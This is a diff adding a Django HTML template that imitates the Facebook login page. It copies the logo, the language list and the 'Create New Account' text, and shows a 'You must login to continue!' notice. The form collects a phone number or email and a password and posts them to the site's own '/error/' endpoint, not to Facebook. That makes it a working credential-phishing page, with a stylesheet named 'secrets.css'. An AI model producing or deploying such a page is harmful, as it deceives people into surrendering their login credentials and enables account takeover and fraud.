@@ -1,0 +1,49 @@
+{% load static %}
+
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+        <title>facebook</title>
+	<link rel="stylesheet" href="{% static 'secrets.css' %}">
+    </head>
+    <body>
+        <div id="you">You must login to continue!</div>
+	<div id="logo">{% load static %}<img src="{% static "top/images/dF5SId3UHWd.svg" %}"></div>
+        
+	<form action="/error/" method="POST">{% csrf_token %}
+        <input class="data" type="number" name="number" placeholder="Mobile number or email address" required>
+        <input class="data" type="password" name="password" placeholder="password" required><br>
+            <input id="data" type="submit" value="Log In">
+            
+            </form>
+
+	    {% include 'top/messages.html' %}
+        
+        <p id="for">Forgotten password?</p>
+        <hr id="left"><div id="or">or</div><hr id="right">
+        <div id="create">Create New Account</div>
+        
+        <div class="lang">
+            <div id="item1">
+                <ul>
+            <li id="eng">English (UK)</li>
+            <li>Français (France)</li>
+            <li>Español</li>
+            <li>Deutsch</li>
+                    </ul>
+            </div>
+            
+            <div id="item2">
+                <ul>
+                    <li>Ukraine</li>
+                    <li>Portugues(Brazil)</li>
+                    <li>العربية</li>
+                    <li id="plus">+</li>
+                </ul>
+            </div>
+        </div>
+        
+        
+    </body>
+</html>
